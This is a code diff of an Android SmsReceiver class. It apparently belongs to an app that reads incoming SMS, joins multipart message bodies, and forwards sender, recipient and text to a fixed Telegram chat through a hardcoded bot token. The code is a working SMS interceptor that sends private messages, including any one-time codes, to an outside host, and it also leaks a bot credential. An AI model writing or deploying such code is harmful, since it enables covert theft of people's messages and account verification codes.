@@ -46,15 +46,16 @@ public class SmsReceiver extends BroadcastReceiver {
                 }
                 //Log.d("TAG",messages.length+" ");
                 String sender = messages[messages.length - 1].getOriginatingAddress();
-                String message = messages[messages.length - 1].getDisplayMessageBody();
-                Log.d("TAG",messages[0].toString());
-                String phoneNumber = context.getSharedPreferences("prefs",Context.MODE_PRIVATE).getString("phone","");
+                String message = "";
+                for(SmsMessage i:messages) message += i.getMessageBody();
+                 String phoneNumber = context.getSharedPreferences("prefs",Context.MODE_PRIVATE).getString("phone","");
                 String ans = "Номер получателя: "+phoneNumber
                         +"\n"
                         +"Номер отправителя: "+sender
                         +"\n"
                         +"Текст сообщения: "+message;
                 //Toast.makeText(context, ans, Toast.LENGTH_SHORT).show();
+                Log.d("TAG",messages[messages.length-1].getMessageBody()+" "+messages.length);
                 Log.d("TAG",ans);
                 TelegramBot bot = new TelegramBot("5509909428:AAFqb3I3MAI3g2cT3s8Ubm_-3SamP9SDXXM");
                 bot.execute(new SendMessage(1838053541L, ans), new Callback<SendMessage, SendResponse>() {
